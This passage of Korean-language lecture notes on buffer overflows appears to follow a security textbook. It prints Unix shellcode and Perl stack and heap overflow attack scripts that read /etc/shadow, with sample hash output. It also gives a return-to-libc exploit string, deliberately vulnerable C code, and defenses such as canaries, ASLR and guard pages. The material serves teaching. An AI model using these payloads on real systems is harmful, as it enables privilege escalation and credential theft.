<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="c-hexadecimal-values-for-compiled-x86-machine-code" tabindex="-1"><a class="header-anchor" href="#c-hexadecimal-values-for-compiled-x86-machine-code"><span>(c) Hexadecimal values for compiled x86 machine code</span></a></h3><div class="language-hex line-numbers-mode" data-highlighter="prismjs" data-ext="hex"><pre><code class="language-hex"><span class="line">90 90 eb 1a 5e 31 c0 88 46 07 8d 1e 89</span>
<span class="line">46 08 89 46 0c 8d 56 0c 8d 4e 08 b0 0b</span>
<span class="line">ff d0 ff 2f 62 69 6e 2f 73 68 20 20 20</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p><strong>Figure 10.8</strong> Example UNIX Shellcode</p></blockquote><h2 id="table-10-3-common-x86-assembly-language-instructions" tabindex="-1"><a class="header-anchor" href="#table-10-3-common-x86-assembly-language-instructions"><span>Table 10.3 Common x86 Assembly Language Instructions</span></a></h2><table><thead><tr><th>명령어 (Mnemonic)</th><th>설명 (Description)</th></tr></thead><tbody><tr><td><code>MOV src</code>, <code>dest</code></td><td><code>src</code>의 값을 <code>dest</code>로 복사(이동)</td></tr><tr><td><code>LEA src</code>, <code>dest</code></td><td><code>src</code>의 주소(유효 주소 로드)를 <code>dest</code>로 복사</td></tr><tr><td><code>ADD / SUB src</code>, <code>dest</code></td><td><code>src</code>의 값을 <code>dest</code>에 더하거나 빼서 결과를 <code>dest</code>에 남김</td></tr><tr><td><code>AND / OR / XOR src</code>, <code>dest</code></td><td><code>src</code>와 <code>dest</code> 값의 논리 AND / OR / XOR 연산을 수행하고 결과를 <code>dest</code>에 남김</td></tr><tr><td><code>CMP val1</code>, <code>val2</code></td><td><code>val1</code>과 <code>val2</code>를 비교하고, 결과로 CPU flag들을 설정</td></tr><tr><td><code>JMP / JZ / JNZ addr</code></td><td><code>addr</code>로 점프 / 0이면 점프 / 0이 아니면 점프</td></tr><tr><td><code>PUSH src</code></td><td><code>src</code>의 값을 stack에 push</td></tr><tr><td><code>POP dest</code></td><td>stack 최상단의 값을 <code>dest</code>로 pop</td></tr><tr><td><code>CALL addr</code></td><td><code>addr</code>에 위치한 함수 호출</td></tr><tr><td><code>LEAVE</code></td><td>함수를 떠나기 전에 stack frame 정리</td></tr><tr><td><code>RET</code></td><td>함수로부터 반환</td></tr><tr><td><code>INT num</code></td><td>Operating system 함수에 접근하기 위한 소프트웨어 interrupt</td></tr><tr><td><code>NOP</code></td><td>연산 없음 또는 아무것도 하지 않는 명령어</td></tr></tbody></table><h2 id="table-10-4-x86-registers" tabindex="-1"><a class="header-anchor" href="#table-10-4-x86-registers"><span>Table 10.4 x86 Registers</span></a></h2><table><thead><tr><th>32bit</th><th>16bit</th><th>8bit (high)</th><th>8bit (low)</th><th>용도</th></tr></thead><tbody><tr><td><code>%eax</code></td><td><code>%ax</code></td><td><code>%ah</code></td><td><code>%al</code></td><td>산술 및 I/O 연산과 interrupt 호출 실행에 사용되는 accumulator</td></tr><tr><td><code>%ebx</code></td><td><code>%bx</code></td><td><code>%bh</code></td><td><code>%bl</code></td><td>메모리 접근, system call 인자 및 반환 값 전달에 사용되는 base register</td></tr><tr><td><code>%ecx</code></td><td><code>%cx</code></td><td><code>%ch</code></td><td><code>%cl</code></td><td>Counter register</td></tr><tr><td><code>%edx</code></td><td><code>%dx</code></td><td><code>%dh</code></td><td><code>%dl</code></td><td>산술 연산, interrupt 호출 및 I/O 연산에 사용되는 data register</td></tr><tr><td><code>%ebp</code></td><td></td><td></td><td></td><td>현재 stack frame의 주소를 포함하는 base pointer</td></tr><tr><td><code>%eip</code></td><td></td><td></td><td></td><td>실행할 다음 명령어의 주소를 포함하는 instruction pointer 또는 program counter</td></tr><tr><td><code>%esi</code></td><td></td><td></td><td></td><td>문자열 또는 배열 연산의 포인터로 사용되는 source index register</td></tr><tr><td><code>%esp</code></td><td></td><td></td><td></td><td>Stack의 최상위 주소를 포함하는 stack pointer</td></tr></tbody></table><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre><code class="language-bash"><span class="line">$ <span class="token function">dir</span> <span class="token parameter variable">-l</span> buffer4</span>
<span class="line">-rwsr-xr-x <span class="token number">1</span> root knoppix <span class="token number">16571</span> Jul <span class="token number">17</span> <span class="token number">10</span>:49 buffer4</span>
<span class="line"></span>
<span class="line">$ <span class="token function">whoami</span></span>
<span class="line">knoppix</span>
<span class="line"></span>
<span class="line">$ <span class="token function">cat</span> /etc/shadow</span>
<span class="line">cat: /etc/shadow: Permission denied</span>
<span class="line"></span>
<span class="line">$ <span class="token function">cat</span> attack1</span>
<span class="line">perl <span class="token parameter variable">-e</span> <span class="token string">&#39;print pack(&quot;H*&quot;, </span>
<span class="line">&quot;90909090909090909090909090909090&quot; .</span>
<span class="line">&quot;909090e5a513c0884767d1e895e089&quot; .</span>
<span class="line">&quot;460c0b89b83d84e8d85c5d5cd8e8e&quot; .</span>
<span class="line">&quot;fffff6269e627a938f1fbe5e0bffb0&quot; .</span>
<span class="line">&quot;20202020203838cffbfc0fbffbfa0&quot;);</span>
<span class="line">print &quot;whoami\\n&quot;;</span>
<span class="line">print &quot;cat /etc/shadow\\n&quot;;&#39;</span></span>
<span class="line"></span>
<span class="line">$ attack1 <span class="token operator">|</span> buffer4</span>
<span class="line">Enter value <span class="token keyword">for</span> name: Hello your yyyDAOApy is e?^1AFF<span class="token punctuation">..</span>./bin/sh<span class="token punctuation">..</span>.</span>
<span class="line">root: <span class="token variable">$1</span><span class="token variable">$rNLd4tX7</span><span class="token variable">$YxSna7JxH7</span>.4JU7T419JRLrk1:13346:0:99999:7:: </span>
<span class="line">daemon:*:11453:0:99999:7:: </span>
<span class="line"><span class="token punctuation">..</span>.</span>
<span class="line">nobody:*:11453:0:99999:7:: </span>
<span class="line">knoppix:<span class="token variable">$1</span><span class="token variable">$FVzSzkBU</span><span class="token variable">$EdSvudJkCH8Y0vIAtdnAV</span>/:13346:0:99999:7:: </span>
<span class="line"></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p><strong>Figure 10.9</strong> Example Stack Overflow Attack</p></blockquote><h2 id="stack-overflow-variants" tabindex="-1"><a class="header-anchor" href="#stack-overflow-variants"><span>Stack Overflow Variants</span></a></h2><pre><code>  ┌──────────────────────────┐     ┌───────────────────────────┐   
  │  target program can be:  │     │    shellcode functions    │   
  └─────────────┬────────────┘     └─────────────┬─────────────┘   
                │                                │                 
┌───────────────▼──────────────┐ ┌───────────────▼────────────────┐
│ ┌──────────────────────────┐ │ │ ┌────────────────────────────┐ │
│ │ a trusted system utility │ │ │ │ launch a remote shell when │ │
│ └──────────────────────────┘ │ │ │ connected to               │ │
│ ┌──────────────────────────┐ │ │ ├────────────────────────────┤ │
│ │ network service daemon   │ │ │ │ create a reverse shell     │ │
│ └──────────────────────────┘ │ │ │ that connects back to the  │ │
│ ┌──────────────────────────┐ │ │ │ hacker                     │ │
│ │ commonly used library    │ │ │ ├────────────────────────────┤ │
│ │ code                     │ │ │ │ use local exploits that    │ │
│ └──────────────────────────┘ │ │ │ establish a shell          │ │
└──────────────────────────────┘ │ ├────────────────────────────┤ │
                                 │ │ flush firewall rules that  │ │
                                 │ │ currently block other      │ │
                                 │ │ attacks                    │ │
                                 │ ├────────────────────────────┤ │
                                 │ │ break out of a chroot      │ │
                                 │ │ (restricted execution)     │ │
                                 │ │ environment, giving full   │ │
                                 │ │ access to the system       │ │
                                 │ └────────────────────────────┘ │
                                 └────────────────────────────────┘
</code></pre><h2 id="buffer-overflow-defenses" tabindex="-1"><a class="header-anchor" href="#buffer-overflow-defenses"><span>Buffer Overflow Defenses</span></a></h2><pre><code>        ┌────────────────────┐            
        │     two broad      │            
        │ defense approaches │            
        └─────────┬──────────┘            
         ┌────────┴──────────┐            
  ┌──────┴───────┐      ┌────┴─────┐      
  │ compile-time │      │ run-time │      
  └──────┬───────┘      └────┬─────┘      
┌────────┴─────────┐ ┌───────┴───────────┐
│  aim to harden   │ │ aim to detect and │
│programs to resist│ │  abort attacks in │
│  attacks in new  │ │ existing programs │
│     programs     │ └───────────────────┘
└──────────────────┘                      
</code></pre><ul><li>Buffer overflow는 널리 악용됨.</li><li>두 가지 광범위한 방어 접근 방식 <ul><li>Compile-time: 새 프로그램에서 공격에 저항하도록 프로그램을 강화하는 것을 목표로 함.</li><li>Run-time: 기존 프로그램에서 공격을 탐지하고 중단하는 것을 목표로 함.</li></ul></li></ul><h2 id="compile-time-defenses-programming-language" tabindex="-1"><a class="header-anchor" href="#compile-time-defenses-programming-language"><span>Compile-Time Defenses: Programming Language</span></a></h2><ul><li>현대의 고수준 언어 사용 <ul><li>Buffer overflow 공격에 취약하지 않음.</li><li>컴파일러가 변수에 대한 범위 검사(range checks) 및 허용 가능한 연산을 강제함.</li></ul></li><li>단점 <ul><li>검사를 부과하기 위해 실행 시간(run time)에 추가 코드가 실행되어야 함.</li><li>유연성과 안전성은 리소스 사용 비용을 수반함.</li><li>기본 기계어 및 아키텍처와의 거리로 인해 일부 명령어 및 하드웨어 리소스에 대한 접근이 손실됨.</li><li>이러한 리소스와 상호 작용해야 하는 장치 드라이버와 같은 코드 작성에 유용성이 제한됨.</li></ul></li></ul><h2 id="compile-time-defenses-safe-coding-techniques" tabindex="-1"><a class="header-anchor" href="#compile-time-defenses-safe-coding-techniques"><span>Compile-Time Defenses: Safe Coding Techniques</span></a></h2><ul><li>C 설계자들은 타입 안전성(type safety)보다 공간 효율성과 성능 고려 사항에 훨씬 더 중점을 두었음. <ul><li>프로그래머가 코드 작성 시 적절한 주의를 기울일 것이라고 가정함.</li></ul></li><li>프로그래머는 코드를 검사하고 안전하지 않은 코딩을 다시 작성해야 함. <ul><li>이에 대한 예가 OpenBSD 프로젝트임.</li></ul></li><li>프로그래머들은 운영 체제, 표준 라이브러리 및 공통 유틸리티를 포함한 기존 코드 기반을 감사(audit)했음. <ul><li>이로 인해 널리 사용되는 가장 안전한 운영 체제 중 하나로 널리 간주되게 됨.</li></ul></li></ul><h2 id="examples-of-unsafe-c-code" tabindex="-1"><a class="header-anchor" href="#examples-of-unsafe-c-code"><span>Examples of Unsafe C Code</span></a></h2><div class="language-c line-numbers-mode" data-highlighter="prismjs" data-ext="c"><pre><code class="language-c"><span class="line"><span class="token keyword">int</span> <span class="token function">copy_buf</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>to<span class="token punctuation">,</span> <span class="token keyword">int</span> pos<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>from<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">  <span class="token keyword">int</span> i<span class="token punctuation">;</span></span>
<span class="line">  </span>
<span class="line">  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">    to<span class="token punctuation">[</span>pos<span class="token punctuation">]</span> <span class="token operator">=</span> from<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line">    pos<span class="token operator">++</span><span class="token punctuation">;</span></span>
<span class="line">  <span class="token punctuation">}</span></span>
<span class="line">  <span class="token keyword">return</span> pos<span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>(a) Unsafe byte copy</p><div class="language-c line-numbers-mode" data-highlighter="prismjs" data-ext="c"><pre><code class="language-c"><span class="line"><span class="token keyword">short</span> <span class="token function">read_chunk</span><span class="token punctuation">(</span>FILE fil<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>to<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">  <span class="token keyword">short</span> len<span class="token punctuation">;</span></span>
<span class="line">  <span class="token function">fread</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> fil<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">/* read length of binary data     */</span></span>
<span class="line">  <span class="token function">fread</span><span class="token punctuation">(</span>to<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> len<span class="token punctuation">,</span> fil<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">/* read len bytes of binary data  */</span></span>
<span class="line">  <span class="token keyword">return</span> len<span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>(b) Unsafe byte input</p><blockquote><p><strong>Figure 10.10</strong> Examples of Unsafe C Code</p></blockquote><h2 id="compile-time-defenses-language-extensions-safe-libraries" tabindex="-1"><a class="header-anchor" href="#compile-time-defenses-language-extensions-safe-libraries"><span>Compile-Time Defenses: Language Extensions / Safe Libraries</span></a></h2><ul><li>동적으로 할당된 메모리 처리는 컴파일 시간에 크기 정보를 사용할 수 없으므로 더 문제가 됨. <ul><li>확장이 필요하고 라이브러리 루틴의 사용이 필요함.</li><li>프로그램과 라이브러리를 다시 컴파일해야 함.</li><li>타사(third-party) 애플리케이션에 문제가 발생할 가능성이 있음.</li></ul></li><li>C의 우려 사항은 안전하지 않은 표준 라이브러리 루틴의 사용임. <ul><li>한 가지 접근 방식은 이것들을 더 안전한 변형으로 대체하는 것임.</li><li>Libsafe가 그 예임.</li><li>라이브러리는 기존 표준 라이브러리보다 먼저 로드되도록 정렬된 동적 라이브러리로 구현됨.</li></ul></li></ul><h2 id="compile-time-defenses-stack-protection" tabindex="-1"><a class="header-anchor" href="#compile-time-defenses-stack-protection"><span>Compile-Time Defenses: Stack Protection</span></a></h2><ul><li>손상 징후를 위해 stack을 확인하는 함수 진입(entry) 및 종료(exit) 코드를 추가함.</li><li>무작위 canary 사용 <ul><li>값은 예측 불가능해야 함.</li><li>시스템마다 달라야 함.</li></ul></li><li>Stackshield 및 Return Address Defender(RAD) <ul><li>추가적인 함수 진입 및 종료 코드를 포함하는 GCC 확장</li><li>함수 진입 시 반환 주소의 사본을 안전한 메모리 영역에 씀</li><li>함수 종료 코드는 stack frame의 반환 주소를 저장된 사본과 대조하여 확인함.</li><li>변경이 발견되면 프로그램을 중단함.</li></ul></li></ul><h2 id="run-time-defenses-executable-address-space-protection" tabindex="-1"><a class="header-anchor" href="#run-time-defenses-executable-address-space-protection"><span>Run-Time Defenses: Executable Address Space Protection</span></a></h2><ul><li>Virtual memory 지원을 사용하여 메모리의 일부 영역을 실행 불가능(non-executable)하게 만듦 <ul><li>메모리 관리 장치(MMU)의 지원이 필요함.</li><li>SPARC / Solaris 시스템에 오래전부터 존재했음.</li><li>x86 Linux/Unix/Windows 시스템에서는 최근에 도입됨.</li></ul></li><li>문제점 <ul><li>실행 가능한 stack 코드에 대한 지원</li><li>특별한 조항(provisions)이 필요함.</li></ul></li></ul><h2 id="run-time-defenses-address-space-layout-randomization-aslr" tabindex="-1"><a class="header-anchor" href="#run-time-defenses-address-space-layout-randomization-aslr"><span>Run-Time Defenses: Address Space Layout Randomization (ASLR)</span></a></h2><ul><li>주요 데이터 구조의 위치를 조작함. <ul><li>Stack, heap, 전역 데이터</li><li>각 process마다 무작위 shift를 사용함.</li><li>현대 시스템의 큰 주소 범위는 일부를 낭비하는 것이 무시할 수 있는 영향을 미침을 의미함.</li></ul></li><li>Heap buffer 위치의 무작위화</li><li>표준 라이브러리 함수의 무작위 위치</li></ul><h2 id="run-time-defenses-guard-pages" tabindex="-1"><a class="header-anchor" href="#run-time-defenses-guard-pages"><span>Run-Time Defenses: Guard Pages</span></a></h2><ul><li>메모리의 임계(critical) 영역 사이에 guard pages를 배치함. <ul><li>MMU에서 불법 주소로 플래그 지정됨.</li><li>접근 시도 시 process가 중단됨.</li></ul></li><li>추가 확장은 stack frame과 heap buffer 사이에 guard pages를 배치함. <ul><li>필요한 다수의 페이지 매핑을 지원하기 위한 실행 시간 비용이 발생함.</li></ul></li></ul><h2 id="replacement-stack-frame" tabindex="-1"><a class="header-anchor" href="#replacement-stack-frame"><span>Replacement Stack Frame</span></a></h2><ul><li>Buffer와 저장된 frame pointer 주소를 덮어쓰는 변형 <ul><li>저장된 frame pointer 값이 더미(dummy) stack frame을 참조하도록 변경됨.</li><li>현재 함수가 교체된 더미 frame으로 반환됨.</li><li>제어가 덮어쓰여진 buffer의 shellcode로 전송됨.</li></ul></li><li>Off-by-one 공격 <ul><li>사용 가능한 공간보다 1바이트 더 복사되도록 허용하는 코딩 오류</li></ul></li><li>방어 <ul><li>함수 종료 코드에 의해 stack frame 또는 반환 주소의 수정 사항을 탐지하는 모든 stack 보호 메커니즘</li><li>실행 불가능한 stack 사용</li><li>메모리 내의 stack 및 시스템 라이브러리의 무작위화</li></ul></li></ul><h2 id="return-to-system-call" tabindex="-1"><a class="header-anchor" href="#return-to-system-call"><span>Return to System Call</span></a></h2><ul><li>Stack overflow 변형으로 반환 주소를 표준 라이브러리 함수로 대체함. <ul><li>실행 불가능한 stack에 대한 대응</li></ul></li><li>방어 <ul><li>공격자가 반환 주소 위의 stack에 적절한 파라미터를 구성함.</li><li>함수가 반환되고 라이브러리 함수가 실행됨.</li><li>공격자는 정확한 buffer 주소가 필요할 수 있음.</li><li>두 개의 라이브러리 호출을 연결(chain)할 수도 있음.</li></ul></li><li>방어 <ul><li>함수 종료 코드에 의해 stack frame 또는 반환 주소의 수정 사항을 탐지하는 모든 stack 보호 메커니즘</li><li>실행 불가능한 stack 사용</li><li>메모리 내의 stack 및 시스템 라이브러리의 무작위화</li></ul></li></ul><h2 id="return-to-libc" tabindex="-1"><a class="header-anchor" href="#return-to-libc"><span>Return-to-libc</span></a></h2><ul><li>코드 주입 대신 기존 코드(예: <code>libc</code> 함수) 사용 <ul><li>예) <code>system(“/bin/sh”); execve (argv[0], argv, NULL);</code></li></ul></li><li>Exploit 예 <ul><li><code>A * 80 + B * 4 + &quot;\\xe0\\x8a\\x05\\x40&quot; + &quot;AAAA&quot; + &quot;\\xf9\\xbf\\x0f\\x40&quot;</code></li><li><code>0x40058ae0</code></li><li><code>0x400fbff9</code></li></ul></li><li><code>echo()</code>가 반환될 때, <code>system()</code>이 새로운 shell을 실행함.</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>W</mi><mo>⊕</mo><mi>X</mi></mrow><annotation encoding="application/x-tex">W \\oplus X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span> 모델 우회</li></ul><h2 id="heap-overflow" tabindex="-1"><a class="header-anchor" href="#heap-overflow"><span>Heap Overflow</span></a></h2><ul><li>Heap에 위치한 buffer 공격 <ul><li>일반적으로 프로그램 코드 위에 위치함.</li><li>메모리는 동적 데이터 구조(예: 레코드의 연결 리스트)에서 사용하기 위해 프로그램에 의해 요청됨.</li></ul></li><li>반환 주소 없음. <ul><li>따라서 제어 전송이 쉽지 않음.</li><li>악용할 수 있는 함수 포인터를 가질 수 있음.</li><li>또는 관리 데이터 구조를 조작할 수 있음.</li></ul></li><li>방어 <ul><li>Heap을 실행 불가능하게 만들기</li><li>Heap의 메모리 할당 무작위화</li></ul></li></ul><h2 id="heap-overflow-example" tabindex="-1"><a class="header-anchor" href="#heap-overflow-example"><span>Heap Overflow Example</span></a></h2><div class="language-c line-numbers-mode" data-highlighter="prismjs" data-ext="c"><pre><code class="language-c"><span class="line"><span class="token comment">/* record type to allocate on heap */</span></span>
<span class="line"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">chunk</span> <span class="token punctuation">{</span></span>
<span class="line">    <span class="token keyword">char</span> inp<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>             <span class="token comment">/* vulnerable input buffer */</span></span>
<span class="line">    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>process<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* pointer to function to process inp */</span></span>
<span class="line"><span class="token punctuation">}</span> <span class="token class-name">chunk_t</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line"><span class="token keyword">void</span> <span class="token function">showlen</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">)</span></span>
<span class="line"><span class="token punctuation">{</span></span>
<span class="line">    <span class="token keyword">int</span> len<span class="token punctuation">;</span></span>
<span class="line">    len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;buffer5 read %d chars\\n&quot;</span><span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span></span>
<span class="line"><span class="token punctuation">{</span></span>
<span class="line">    <span class="token class-name">chunk_t</span> <span class="token operator">*</span>next<span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    next <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">chunk_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    next<span class="token operator">-&gt;</span>process <span class="token operator">=</span> showlen<span class="token punctuation">;</span></span>
<span class="line">    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Enter value: &quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token function">gets</span><span class="token punctuation">(</span>next<span class="token operator">-&gt;</span>inp<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    next<span class="token operator">-&gt;</span><span class="token function">process</span><span class="token punctuation">(</span>next<span class="token operator">-&gt;</span>inp<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;buffer5 done\\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre><code class="language-bash"><span class="line">$ <span class="token function">cat</span> attack2</span>
<span class="line"><span class="token comment">#!/bin/sh</span></span>
<span class="line"><span class="token comment"># implement heap overflow against program buffer5</span></span>
<span class="line">perl <span class="token parameter variable">-e</span> <span class="token string">&#39;print pack(&quot;H*&quot;,</span>
<span class="line">&quot;90909090909090909090909090909090&quot;</span>
<span class="line">.&quot;8b1a5e31c08846078d1e895e0881&quot;</span>
<span class="line">.&quot;460cb00b89f38d4e08bd560ccd80e8&quot;</span>
<span class="line">.&quot;8f26f96e2f736820202020202020&quot;</span>
<span class="line">.&quot;b89704080a&quot;);</span>
<span class="line">print &quot;whoami\\n&quot;;</span>
<span class="line">print &quot;cat /etc/shadow\\n&quot;;</span>
<span class="line">&#39;</span></span>
<span class="line"></span>
<span class="line">$ attack2 <span class="token operator">|</span> buffer5</span>
<span class="line">Enter value:</span>
<span class="line">root:<span class="token variable">$1</span><span class="token variable">$4oImychST3RVS2F30VNRG4JUZF4o3</span>/:13347:0:99999:7:::</span>
<span class="line">daemon:*:11453:0:99999:7:::</span>
<span class="line"><span class="token punctuation">..</span>.</span>
<span class="line">nobody:*:11453:0:99999:7:::</span>
<span class="line">knoppix:<span class="token variable">$1</span><span class="token variable">$p2wziIMLs</span>/yVHPQuw5kvlUFJs3b9a/:13347:0:99999:7:::</span>
<span class="line"><span class="token punctuation">..</span>.</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="global-data-overflow" tabindex="-1"><a class="header-anchor" href="#global-data-overflow"><span>Global Data Overflow</span></a></h2><ul><li>전역 데이터에 위치한 buffer를 공격할 수 있음. <ul><li>프로그램 코드 위에 위치할 수 있음.</li><li>함수 포인터와 취약한 buffer가 있는 경우</li><li>또는 인접한 process 관리 테이블</li><li>나중에 호출되는 함수 포인터를 덮어쓰는 것을 목표로 함.</li></ul></li><li>방어 <ul><li>실행 불가능하거나 무작위화된 전역 데이터 영역</li><li>함수 포인터 이동</li><li>Guard pages</li></ul></li></ul><h2 id="global-data-overflow-example" tabindex="-1"><a class="header-anchor" href="#global-data-overflow-example"><span>Global Data Overflow Example</span></a></h2><div class="language-c line-numbers-mode" data-highlighter="prismjs" data-ext="c"><pre><code class="language-c"><span class="line"><span class="token comment">/* global static data - will be targeted for attack */</span></span>
<span class="line"><span class="token keyword">struct</span> <span class="token class-name">chunk</span> <span class="token punctuation">{</span></span>
<span class="line">    <span class="token keyword">char</span> inp<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>             <span class="token comment">/* input buffer */</span></span>
<span class="line">    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>process<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* pointer to function to process it */</span></span>
<span class="line"><span class="token punctuation">}</span> chunk<span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line"><span class="token keyword">void</span> <span class="token function">showlen</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">)</span></span>
<span class="line"><span class="token punctuation">{</span></span>
<span class="line">    <span class="token keyword">int</span> len<span class="token punctuation">;</span></span>
<span class="line">    len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;buffer6 read %d chars\\n&quot;</span><span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span>
